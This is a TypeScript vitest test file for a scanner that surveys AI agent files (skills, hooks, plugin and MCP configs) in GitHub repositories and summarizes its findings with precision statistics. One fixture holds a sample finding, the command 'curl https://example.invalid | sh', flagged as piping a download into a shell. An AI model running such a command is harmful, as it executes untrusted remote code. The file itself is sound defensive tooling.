import { describe, expect, it } from "vitest";
import { classifyFile } from "../src/discovery/index.js";
import {
  cohenKappa,
  contextLines,
  isPortablePath,
  parseRepoLinks,
  renderReview,
  renderSummary,
  repoDirName,
  sampleIndices,
  selectAgentFiles,
  selectCandidates,
  selectHookScripts,
  sparsePattern,
  summarize,
  type RepoReport,
  type ReportFinding,
  wilson,
} from "../scripts/corpus/lib.js";

describe("corpus: parseRepoLinks", () => {
  it("extracts repositories from an awesome list, deduplicated, without site pages", () => {
    const md = [
      "- [pdf](https://github.com/acme/pdf-skill) — PDFs",
      "- [pdf again](https://github.com/Acme/PDF-skill/tree/main/skills)",
      "- [repo.git](https://github.com/acme/tool.git).",
      "- [topic](https://github.com/topics/claude) [sponsor](https://github.com/sponsors/acme)",
      "- <https://www.github.com/other/thing>",
    ].join("\n");
    expect(parseRepoLinks(md)).toEqual(["acme/pdf-skill", "acme/tool", "other/thing"]);
  });
});

describe("corpus: selectCandidates", () => {
  it("keeps priority repos first, merges sources and caps the total", () => {
    const picked = selectCandidates(
      [
        { priority: true, candidates: [{ repo: "a/seed", sources: ["seed"] }] },
        {
          priority: false,
          candidates: [
            { repo: "A/Seed", sources: ["search:x"] },
            { repo: "b/one", sources: ["search:x"] },
            { repo: "c/two", sources: ["search:y"] },
          ],
        },
      ],
      2,
    );
    expect(picked).toHaveLength(2);
    expect(picked[0]).toEqual({ repo: "a/seed", sources: ["seed", "search:x"] });
  });

  it("samples search hits in a stable order independent of input order", () => {
    const hits = ["x/1", "x/2", "x/3", "x/4", "x/5"].map((repo) => ({ repo, sources: ["search:q"] }));
    const one = selectCandidates([{ priority: false, candidates: hits }], 3);
    const two = selectCandidates([{ priority: false, candidates: [...hits].reverse() }], 3);
    expect(one).toEqual(two);
  });
});

describe("corpus: selectAgentFiles", () => {
  const tree = [
    "README.md",
    "src/index.ts",
    "CLAUDE.md",
    "docs/AGENTS.md",
    ".mcp.json",
    ".claude/settings.json",
    ".claude/commands/deploy.md",
    ".claude/skills/pdf/SKILL.md",
    ".claude/skills/pdf/scripts/run.py",
    ".claude/skills/pdf/logo.png",
    "plugins/p/.claude-plugin/plugin.json",
    "plugins/p/hooks/hooks.json",
    "plugins/p/commands/go.md",
    "plugins/p/src/lib.ts",
  ];

  it("selects what discovery scans and nothing else", () => {
    const { files } = selectAgentFiles(tree, { maxFiles: 100 });
    expect(files.sort()).toEqual(
      [
        "CLAUDE.md",
        "docs/AGENTS.md",
        ".mcp.json",
        ".claude/settings.json",
        ".claude/commands/deploy.md",
        ".claude/skills/pdf/SKILL.md",
        ".claude/skills/pdf/scripts/run.py",
        "plugins/p/.claude-plugin/plugin.json",
        "plugins/p/hooks/hooks.json",
        "plugins/p/commands/go.md",
      ].sort(),
    );
  });

  it("also selects other agents' files and the scripts in hook folders", () => {
    const sel = selectAgentFiles(
      [".cursor/rules/a.mdc", ".github/copilot-instructions.md", ".claude/hooks/guard.sh", "plugins/p/hooks/run.sh", "src/app.ts"],
      { maxFiles: 100 },
    );
    expect(sel.files.sort()).toEqual([".claude/hooks/guard.sh", ".cursor/rules/a.mdc", ".github/copilot-instructions.md"].sort());
    const plugin = selectAgentFiles(["plugins/p/.claude-plugin/plugin.json", "plugins/p/hooks/run.sh", "plugins/p/src/x.ts"], { maxFiles: 100 });
    expect(plugin.files.sort()).toEqual(["plugins/p/.claude-plugin/plugin.json", "plugins/p/hooks/run.sh"]);
  });

  it("treats a root-level SKILL.md as a skill covering the whole repo, standalone files first", () => {
    const sel = selectAgentFiles(["a.py", "b.py", "SKILL.md", ".mcp.json"], { maxFiles: 2 });
    expect(sel.files.slice(0, 2)).toEqual(["SKILL.md", ".mcp.json"]);
    expect(sel.truncated).toBe(2);
  });

  it("selects the same files as a plain scan over every skill and plugin, on random trees", () => {
    // The selection before parent-directory lookups: every path checked against every skill and plugin directory.
    const reference = (paths: string[], maxFiles: number) => {
      const abs = (p: string) => `/r/${p}`;
      const dirOf = (p: string) => (p.includes("/") ? p.slice(0, p.lastIndexOf("/")) : "");
      const skillDirs = paths.filter((p) => p === "SKILL.md" || p.endsWith("/SKILL.md")).map(dirOf);
      const pluginRoots = paths
        .filter((p) => p === ".claude-plugin/plugin.json" || p.endsWith("/.claude-plugin/plugin.json"))
        .map((p) => abs(p).slice(0, -"/.claude-plugin/plugin.json".length));
      const pluginDirs = pluginRoots.map((r) => r.slice("/r/".length));
      const inSkill = (p: string) => skillDirs.some((d) => d === "" || p.startsWith(d + "/"));
      const inHookDir = (p: string) =>
        /(?:^|\/)\.(?:claude|cursor)\/hooks\//.test(p) || pluginDirs.some((d) => p.startsWith(d === "" ? "hooks/" : `${d}/hooks/`));
      const isAgentFile = (p: string) => p === "SKILL.md" || p.endsWith("/SKILL.md") || !!classifyFile(abs(p), pluginRoots);
      const selected = paths.filter((p) => inSkill(p) || isAgentFile(p) || inHookDir(p));
      selected.sort((a, b) => Number(!isAgentFile(a)) - Number(!isAgentFile(b)));
      return selected.slice(0, maxFiles);
    };
    let seed = 42;
    const rand = (n: number) => (seed = (seed * 16807) % 2147483647) % n;
    const dirs = ["", "a", "a/b", "plugins/p", "plugins/p/sub", "skills/x", "skills/x/deep", "hooks", "a/hooks", ".claude", ".claude/hooks"];
    const names = ["SKILL.md", "README.md", "run.sh", "CLAUDE.md", "AGENTS.md", ".mcp.json", "notes.txt", "commands/go.md", "agents/a.md",
      "hooks/hooks.json", "hooks/guard.sh", ".claude-plugin/plugin.json", "settings.json", "x.py"];
    for (let round = 0; round < 300; round++) {
      const tree = [...new Set(Array.from({ length: 1 + rand(40) }, () => {
        const d = dirs[rand(dirs.length)]!;
        const n = names[rand(names.length)]!;
        return d ? `${d}/${n}` : n;
      }))];
      const max = 1 + rand(30);
      expect(selectAgentFiles(tree, { maxFiles: max }).files, JSON.stringify(tree)).toEqual(reference(tree, max));
    }
  });

  it("stays fast on a tree of 130k files with thousands of skills", () => {
    const tree: string[] = [];
    for (let s = 0; s < 6000; s++) for (let f = 0; f < 22; f++) tree.push(`skills/s${s}/${f === 0 ? "SKILL.md" : `ref/f${f}.md`}`);
    const started = performance.now();
    const sel = selectAgentFiles(tree, { maxFiles: 25_000 });
    expect(sel.files).toHaveLength(25_000);
    expect(performance.now() - started).toBeLessThan(5_000);
  });

  it("drops paths that cannot be checked out on Windows when asked", () => {
    const sel = selectAgentFiles(["skills/x/SKILL.md", "skills/x/a:b.md", "skills/x/con.txt"], { maxFiles: 10, portable: true });
    expect(sel.files).toEqual(["skills/x/SKILL.md"]);
    expect(sel.unportable).toBe(2);
  });
});

describe("corpus: precision sampling", () => {
  it("sampleIndices draws distinct indices in range, reproducibly per seed", () => {
    const a = sampleIndices(1000, 50, 7);
    expect(a).toHaveLength(50);
    expect(new Set(a).size).toBe(50);
    expect(a.every((i) => i >= 0 && i < 1000)).toBe(true);
    expect(a).toEqual([...a].sort((x, y) => x - y));
    expect(sampleIndices(1000, 50, 7)).toEqual(a);
    expect(sampleIndices(1000, 50, 8)).not.toEqual(a);
    expect(sampleIndices(5, 10, 1)).toEqual([0, 1, 2, 3, 4]);
  });

  it("sampleIndices is roughly uniform", () => {
    const hits = new Array(10).fill(0);
    for (let seed = 1; seed <= 2000; seed++) for (const i of sampleIndices(10, 1, seed)) hits[i]++;
    for (const h of hits) expect(h).toBeGreaterThan(140);
  });

  it("wilson matches the textbook interval", () => {
    const { p, low, high } = wilson(51, 60);
    expect(p).toBeCloseTo(0.85, 5);
    expect(low).toBeCloseTo(0.7386, 3);
    expect(high).toBeCloseTo(0.9191, 3);
    expect(wilson(0, 0)).toEqual({ p: 0, low: 0, high: 0 });
    expect(wilson(10, 10).high).toBe(1);
  });

  it("cohenKappa matches the textbook example", () => {
    // 50 items: both yes 20, A yes / B no 5, A no / B yes 10, both no 15 → po 0.7, pe 0.5, κ 0.4.
    const pairs: [boolean, boolean][] = [
      ...Array<[boolean, boolean]>(20).fill([true, true]),
      ...Array<[boolean, boolean]>(5).fill([true, false]),
      ...Array<[boolean, boolean]>(10).fill([false, true]),
      ...Array<[boolean, boolean]>(15).fill([false, false]),
    ];
    const { agreement, kappa } = cohenKappa(pairs);
    expect(agreement).toBeCloseTo(0.7, 5);
    expect(kappa).toBeCloseTo(0.4, 5);
    expect(cohenKappa([["a", "a"], ["a", "a"]])).toEqual({ agreement: 1, kappa: 1 });
    expect(cohenKappa([])).toEqual({ agreement: 0, kappa: 0 });
  });

  it("contextLines returns the window around a line, clipped and cut", () => {
    const text = ["a", "b", "c", "d", "x".repeat(300)].join("\n");
    expect(contextLines(text, 1, 1)).toEqual([{ n: 1, text: "a" }, { n: 2, text: "b" }]);
    const last = contextLines(text, 5, 1, 10);
    expect(last.map((l) => l.n)).toEqual([4, 5]);
    expect(last[1]!.text).toBe(`${"x".repeat(10)}…`);
  });
});

describe("corpus: selectHookScripts", () => {
  it("adds the scripts hooks name that exist in the tree and are not selected yet, once", () => {
    const tree = [".claude/settings.json", ".claude/hooks/a.sh", "scripts/guard.sh", "tools/bin/check", "x/a:b.sh"];
    const selected = [".claude/settings.json", ".claude/hooks/a.sh"];
    const named = [".claude/hooks/a.sh", "scripts/guard.sh", "scripts/guard.sh", "tools/bin/check", "missing.sh", "x/a:b.sh"];
    expect(selectHookScripts(tree, selected, named, { portable: true })).toEqual(["scripts/guard.sh", "tools/bin/check"]);
    expect(selectHookScripts(tree, selected, named)).toEqual(["scripts/guard.sh", "tools/bin/check", "x/a:b.sh"]);
  });
});

describe("corpus: path helpers", () => {
  it("isPortablePath", () => {
    expect(isPortablePath("a/b/c.md")).toBe(true);
    for (const bad of ["a/b?.md", "a/NUL", "a/x.", "a/ x ", "a//b", ".git/hooks/x", "a/GIT~1/config", "a/.GIT/config", "x.md::$DATA"]) {
      expect(isPortablePath(bad), bad).toBe(false);
    }
  });

  it("sparsePattern anchors and escapes glob characters", () => {
    expect(sparsePattern("a/b.md")).toBe("/a/b.md");
    expect(sparsePattern("a/[x]*!#.md")).toBe("/a/\\[x\\]\\*\\!\\#.md");
  });

  it("repoDirName", () => {
    expect(repoDirName("acme/tool")).toBe("acme__tool");
    expect(repoDirName("acme/C.E.O.")).toBe("acme__C.E.O_");
  });
});

const finding = (over: Partial<ReportFinding>): ReportFinding => ({
  ruleId: "SW004",
  severity: "high",
  confidence: "high",
  file: "SKILL.md",
  line: 3,
  message: "pipes a download into a shell",
  snippet: "curl https://example.invalid | sh",
  ...over,
});

const report = (repo: string, findings: ReportFinding[], kinds: string[] = ["skill"]): RepoReport => ({
  repo,
  sha: "0123456789abcdef0123",
  report: {
    version: 1,
    summary: { targets: kinds.length, files: kinds.length, findings: findings.length },
    targets: kinds.map((kind, i) => ({ kind, path: `t${i}`, files: [`t${i}`] })),
    findings,
    skipped: [{ path: "x.png", reason: "binary file" }],
    errors: [],
  },
});

describe("corpus: summarize", () => {
  const reports = [
    report("a/one", [finding({}), finding({ ruleId: "SW005", severity: "medium", file: "CLAUDE.md" })]),
    report("b/two", [finding({ severity: "low", confidence: "low" })], ["skill", "settings"]),
    report("c/three", []),
  ];
  const s = summarize(reports);

  it("counts repos, targets and findings", () => {
    expect(s.repos).toBe(3);
    expect(s.targets).toBe(4);
    expect(s.targetsByKind).toEqual({ skill: 3, settings: 1 });
    expect(s.findings).toBe(3);
    expect(s.bySeverity).toEqual({ info: 0, low: 1, medium: 1, high: 1 });
    expect(s.reposByWorstSeverity).toEqual({ info: 0, low: 1, medium: 0, high: 1, none: 1 });
    expect(s.skipped).toEqual({ "binary file": 3 });
  });

  it("aggregates per rule", () => {
    const sw004 = s.rules.find((r) => r.ruleId === "SW004")!;
    expect(sw004).toMatchObject({ findings: 2, repos: 2, files: 2, byConfidence: { high: 1, low: 1 } });
    expect(s.noisiestFiles[0]).toEqual({ repo: "a/one", file: "CLAUDE.md", findings: 1 });
  });

  it("renders Markdown that keeps quoted content inert", () => {
    const md = renderSummary(summarize([report("a/one", [finding({ file: "x|`y`\n.md" })])]), { generatedAt: "now", tool: "skillward 0" });
    expect(md).toContain("| SW004 | 1 | 1 | 1 | 1 | 0 | 0 | 0 |");
    expect(md).toContain("x\\|'y' .md");
    const reviewMd = renderReview(reports, "medium");
    expect(reviewMd).toContain("## a/one @ 0123456789ab");
    expect(reviewMd).not.toContain("b/two");
  });
});
